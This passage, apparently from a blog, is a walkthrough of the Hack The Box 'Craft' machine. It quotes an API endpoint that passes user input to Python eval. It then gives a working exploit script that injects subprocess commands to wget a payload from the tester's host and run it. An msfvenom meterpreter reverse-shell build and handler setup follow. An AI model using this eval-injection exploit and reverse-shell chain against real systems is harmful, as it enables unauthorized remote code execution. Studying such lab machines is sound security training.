&lt;p&gt;You can probably skip this part but I wanted to check the token to make sure it&#x27;s validated each time it&#x27;s being generated. There is an endpoint named &lt;code&gt;auth&#x2F;check&lt;&#x2F;code&gt; that will do the trick.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;requests
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;json
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;response = requests.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;get&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;https:&#x2F;&#x2F;api.craft.htb&#x2F;api&#x2F;auth&#x2F;login&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;auth&lt;&#x2F;span&gt;&lt;span&gt;=(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;dinesh&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;, &amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;4aUh0A8PbVJxgd&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;), &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;verify&lt;&#x2F;span&gt;&lt;span&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;False&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;json_response = json.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;loads&lt;&#x2F;span&gt;&lt;span&gt;(response.text)
&lt;&#x2F;span&gt;&lt;span&gt;status = response.status_code
&lt;&#x2F;span&gt;&lt;span&gt;token = json_response[&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;token&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;]
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;\n&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot; + &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;str&lt;&#x2F;span&gt;&lt;span&gt;(token))
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;str&lt;&#x2F;span&gt;&lt;span&gt;(status) + &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;\n&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;)
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;headerinfo = {&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;X-Craft-Api-Token&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;: token, &amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;Content-Type&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;: &amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;application&#x2F;json&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;}
&lt;&#x2F;span&gt;&lt;span&gt;response2 = requests.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;get&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;https:&#x2F;&#x2F;api.craft.htb&#x2F;api&#x2F;auth&#x2F;check&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;headers&lt;&#x2F;span&gt;&lt;span&gt;=headerinfo, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;verify&lt;&#x2F;span&gt;&lt;span&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;False&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;json_response2 = json.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;loads&lt;&#x2F;span&gt;&lt;span&gt;(response2.text)
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;\n&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot; + &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;str&lt;&#x2F;span&gt;&lt;span&gt;(json_response2))
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;str&lt;&#x2F;span&gt;&lt;span&gt;(response2.status_code) + &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;\n&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;)
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;So now we got the token generated, validated, and ability to grab brew information from the API, what to do next? This is where I got stuck the longest but I learned about fixing my enumeration processes.&lt;&#x2F;p&gt;
&lt;p&gt;I fell into two rabbit holes:&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;Trying to exploit &lt;code&gt;phpmyadmin-dir-traversal&lt;&#x2F;code&gt; which isn&#x27;t a smart move because we didn&#x27;t find &lt;code&gt;phpmyadmin&lt;&#x2F;code&gt; in the first place! I didn&#x27;t get stuck here long though.&lt;&#x2F;li&gt;
&lt;li&gt;Running &lt;code&gt;dirbuster&lt;&#x2F;code&gt; on &lt;code&gt;api.craft.htb&lt;&#x2F;code&gt; and see if there is a hidden directory we may have missed.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;I&#x27;m not particular strong in code review because I haven&#x27;t studied the possible exploitation when using certain functions. This is good practice for me though. I found the exploit code in this file: https:&#x2F;&#x2F;gogs.craft.htb&#x2F;Craft&#x2F;craft-api&#x2F;src&#x2F;master&#x2F;craft_api&#x2F;api&#x2F;brew&#x2F;endpoints&#x2F;brew.py&lt;&#x2F;p&gt;
&lt;p&gt;Particularly this piece of code:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span&gt;    @auth.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;auth_required
&lt;&#x2F;span&gt;&lt;span&gt;    @api.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;expect&lt;&#x2F;span&gt;&lt;span&gt;(beer_entry)
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;post&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;):
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;&amp;quot;&amp;quot;&amp;quot;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;        Creates a new brew entry.
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;        &amp;quot;&amp;quot;&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;# make sure the ABV value is sane.
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;eval&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;%s&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt; &amp;gt; 1&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39; % request.json[&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;abv&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;]):
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;ABV must be a decimal value less than 1.0&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;400
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;else&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;create_brew&lt;&#x2F;span&gt;&lt;span&gt;(request.json)
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;None&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;201
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;A quick Google search will show sites that talks about how &lt;code&gt;eval&lt;&#x2F;code&gt; can be exploited if misused. &lt;&#x2F;p&gt;
&lt;p&gt;&lt;a href=&quot;https:&#x2F;&#x2F;nedbatchelder.com&#x2F;blog&#x2F;201206&#x2F;eval_really_is_dangerous.html&quot;&gt;Eval really is dangerous&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;A quick note about &lt;code&gt;eval&lt;&#x2F;code&gt; is the function evaluates the parameter given. If you evaluate an untrusted or unsanitized input, you can execute commands on the victim&#x27;s machine.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Armed with new knowledge, I fleshed out the rest of the code with remote code execution.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;requests
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;json
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;response = requests.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;get&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;https:&#x2F;&#x2F;api.craft.htb&#x2F;api&#x2F;auth&#x2F;login&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;auth&lt;&#x2F;span&gt;&lt;span&gt;=(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;dinesh&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;, &amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;4aUh0A8PbVJxgd&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;), &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;verify&lt;&#x2F;span&gt;&lt;span&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;False&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;json_response = json.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;loads&lt;&#x2F;span&gt;&lt;span&gt;(response.text)
&lt;&#x2F;span&gt;&lt;span&gt;status = response.status_code
&lt;&#x2F;span&gt;&lt;span&gt;token = json_response[&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;token&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;]
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;\n&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot; + &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;str&lt;&#x2F;span&gt;&lt;span&gt;(token))
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;str&lt;&#x2F;span&gt;&lt;span&gt;(status) + &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;\n&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;)
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;headerinfo = {&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;X-Craft-Api-Token&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;: token, &amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;Content-Type&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;: &amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;application&#x2F;json&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;}
&lt;&#x2F;span&gt;&lt;span&gt;response2 = requests.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;get&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;https:&#x2F;&#x2F;api.craft.htb&#x2F;api&#x2F;auth&#x2F;check&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;headers&lt;&#x2F;span&gt;&lt;span&gt;=headerinfo, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;verify&lt;&#x2F;span&gt;&lt;span&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;False&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;json_response2 = json.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;loads&lt;&#x2F;span&gt;&lt;span&gt;(response2.text)
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;\n&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot; + &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;str&lt;&#x2F;span&gt;&lt;span&gt;(json_response2))
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;str&lt;&#x2F;span&gt;&lt;span&gt;(response2.status_code) + &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;\n&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;)
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;brew_dict = {}
&lt;&#x2F;span&gt;&lt;span&gt;brew_dict[&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;abv&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;] = &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;__import__(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;\&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;subprocess&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;\&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;).getoutput(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;\&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;wget http:&#x2F;&#x2F;10.10.14.13&#x2F;rs.py&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;\&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;)&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;brew_dict[&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;name&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;] = &amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;bullshit&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;
&lt;&#x2F;span&gt;&lt;span&gt;brew_dict[&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;brewer&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;] = &amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;bullshit&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;
&lt;&#x2F;span&gt;&lt;span&gt;brew_dict[&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;style&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;] = &amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;bullshit&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;json_data = json.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;dumps&lt;&#x2F;span&gt;&lt;span&gt;(brew_dict)
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;response3 = requests.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;post&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;https:&#x2F;&#x2F;api.craft.htb&#x2F;api&#x2F;brew&#x2F;&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;headers&lt;&#x2F;span&gt;&lt;span&gt;=headerinfo, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;data&lt;&#x2F;span&gt;&lt;span&gt;=json_data, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;verify&lt;&#x2F;span&gt;&lt;span&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;False&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;json_response3 = json.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;loads&lt;&#x2F;span&gt;&lt;span&gt;(response3.text)
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;\n&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot; + &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;str&lt;&#x2F;span&gt;&lt;span&gt;(response3.status_code))
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(json_response3)
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;brew_dict2 = {}
&lt;&#x2F;span&gt;&lt;span&gt;brew_dict2[&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;abv&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;] = &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;__import__(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;\&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;subprocess&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;\&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;).getoutput(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;\&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;python rs.py&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;\&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;)&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;brew_dict2[&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;name&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;] = &amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;bullshit&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;
&lt;&#x2F;span&gt;&lt;span&gt;brew_dict2[&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;brewer&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;] = &amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;bullshit&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;
&lt;&#x2F;span&gt;&lt;span&gt;brew_dict2[&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;style&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;] = &amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;bullshit&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;json_data2 = json.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;dumps&lt;&#x2F;span&gt;&lt;span&gt;(brew_dict2)
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;response4 = requests.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;post&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;https:&#x2F;&#x2F;api.craft.htb&#x2F;api&#x2F;brew&#x2F;&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;headers&lt;&#x2F;span&gt;&lt;span&gt;=headerinfo, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;data&lt;&#x2F;span&gt;&lt;span&gt;=json_data2, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;verify&lt;&#x2F;span&gt;&lt;span&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;False&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;json_response34= json.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;loads&lt;&#x2F;span&gt;&lt;span&gt;(response4.text)
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;In addition, I need to generate the python reverse shell code.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;msfvenom -p&lt;&#x2F;span&gt;&lt;span&gt; python&#x2F;meterpreter&#x2F;reverse_tcp LHOST=10.10.14.13 LPORT=4444&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt; -o&lt;&#x2F;span&gt;&lt;span&gt; rs.py
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Start python web server and meterpreter session to receive my reverse shell connection.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;python -m&lt;&#x2F;span&gt;&lt;span&gt; SimpleHTTPServer 80
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;msfconsole
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;use&lt;&#x2F;span&gt;&lt;span&gt; exploit&#x2F;multi&#x2F;handler
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;set&lt;&#x2F;span&gt;&lt;span&gt; payload python&#x2F;meterpreter&#x2F;reverse_tcp
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;set&lt;&#x2F;span&gt;&lt;span&gt; LHOST 10.10.14.13
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;set&lt;&#x2F;span&gt;&lt;span&gt; LPORT 4444
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;run
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Run the script and I&#x27;m able to receive a shell on meterpreter session.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;To my surprise, the &lt;code&gt;user.txt&lt;&#x2F;code&gt; flag is non-existent. I thought someone deleted the flag but nope, I am stuck in a containerized instance as &lt;code&gt;hostname&lt;&#x2F;code&gt; shows a string of random letters and numbers.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;I got lost for a while trying to figure out how to break out of this instance. I noticed there is a directory at &lt;code&gt;&#x2F;opt&#x2F;app&lt;&#x2F;code&gt; that resembles the same code as the repository. Out of chance, I noticed there is a file called &lt;code&gt;models.py&lt;&#x2F;code&gt;. This file generates the database structure for brew and one other important table, &amp;quot;Users&amp;quot;.&lt;&#x2F;p&gt;
